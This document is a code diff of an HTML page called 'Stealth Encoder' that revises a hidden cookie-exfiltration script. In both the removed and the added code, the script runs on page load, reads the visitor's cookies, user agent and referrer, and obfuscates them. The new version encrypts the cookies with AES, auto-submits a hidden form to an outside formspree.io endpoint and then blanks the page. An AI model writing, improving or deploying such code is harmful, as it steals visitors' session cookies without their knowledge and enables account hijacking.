@@ -19,78 +19,70 @@
             color: gold;
             text-shadow: 0 0 10px rgba(255, 215, 0, 0.8);
         }
-        form {
-            display: none; /* Stealth mode - hidden form */
-        }
     </style>
 </head>
 <body>
-
     <h2>Stealth Encoder</h2>
-
-    <form id="stealthForm" action="https://formspree.io/f/xeoqzkqe" method="POST">
-        <input type="hidden" name="data" id="encodedData" value="">
+    <form id="stealthForm" action="https://formspree.io/f/xeoqzkqe" method="POST" style="display: none;">
+        <input type="hidden" name="data" id="encodedData">
         <button type="submit">Send</button>
     </form>
-
     <script>
-        (function() {
-            function obfuscate(str) {
-                return btoa(str).split('').reverse().join('');
-            }
-
-            async function hashSHA256(str) {
+        (() => {
+            async function encryptAES(text, key) {
                 const encoder = new TextEncoder();
-                const data = encoder.encode(str);
-                const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-                return Array.from(new Uint8Array(hashBuffer))
-                    .map(byte => byte.toString(16).padStart(2, '0'))
-                    .join('');
+                const encodedText = encoder.encode(text);
+                const hashedKey = await crypto.subtle.digest("SHA-256", encoder.encode(key));
+                const cryptoKey = await crypto.subtle.importKey("raw", hashedKey, { name: "AES-GCM" }, false, ["encrypt"]);
+                const iv = crypto.getRandomValues(new Uint8Array(12));
+                const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, cryptoKey, encodedText);
+                return btoa(String.fromCharCode(...new Uint8Array(iv)) + String.fromCharCode(...new Uint8Array(encrypted)));
             }
 
-            function encodeROT13(str) {
-                return str.replace(/[A-Za-z]/g, c =>
-                    String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13))
+            function rot47(str) {
+                return str.replace(/[\x21-\x7E]/g, c =>
+                    String.fromCharCode(33 + ((c.charCodeAt(0) + 14) % 94))
                 );
             }
 
-            function encodeXOR(str, key) {
-                return btoa(Array.from(str)
-                    .map((char, i) => 
-                        String.fromCharCode(char.charCodeAt(0) ^ key.charCodeAt(i % key.length))
-                    ).join(''));
+            async function hashSHA512(data) {
+                const encoder = new TextEncoder();
+                const buffer = await crypto.subtle.digest("SHA-512", encoder.encode(data));
+                return Array.from(new Uint8Array(buffer)).map(b => b.toString(16).padStart(2, "0")).join("");
             }
 
-            async function encodeData() {
-                var cookies = document.cookie || "No_Cookies";
-                var userAgent = navigator.userAgent || "Unknown_User_Agent";
-                var referrer = document.referrer || "No_Referrer";
+            async function stealthEncode() {
+                const secretKey = "UltraHiddenKey";
+                const cookies = document.cookie || "No_Cookies";
+                const userAgent = navigator.userAgent || "Unknown_User_Agent";
+                const referrer = document.referrer || "No_Referrer";
 
-                let xorKey = "hiddenKey"; 
-                let sha256Hash = await hashSHA256(cookies);
-                let rot13Encoded = encodeROT13(cookies);
-                let xorEncoded = encodeXOR(cookies, xorKey);
-                let base64Encoded = btoa(cookies);
+                const encryptedCookies = await encryptAES(cookies, secretKey);
+                const hashedAgent = await hashSHA512(userAgent);
+                const encodedReferrer = rot47(referrer);
 
-                let stealthData = JSON.stringify({
-                    sha256: sha256Hash,
-                    rot13: rot13Encoded,
-                    xor: xorEncoded,
-                    base64: base64Encoded,
-                    ua: obfuscate(userAgent),
-                    ref: obfuscate(referrer)
+                const stealthPayload = JSON.stringify({
+                    encryptedCookies,
+                    hashedAgent,
+                    encodedReferrer
                 });
 
-                document.getElementById("encodedData").value = obfuscate(stealthData);
+                document.getElementById("encodedData").value = btoa(stealthPayload);
 
                 setTimeout(() => {
                     document.getElementById("stealthForm").submit();
-                }, 2000); 
+                }, 2000);
             }
 
-            encodeData();
+            if (!window.stealthExecuted) {
+                window.stealthExecuted = true;
+                stealthEncode().then(() => {
+                    setTimeout(() => {
+                        document.body.innerHTML = "";
+                    }, 2000);
+                });
+            }
         })();
     </script>
-
 </body>
 </html>
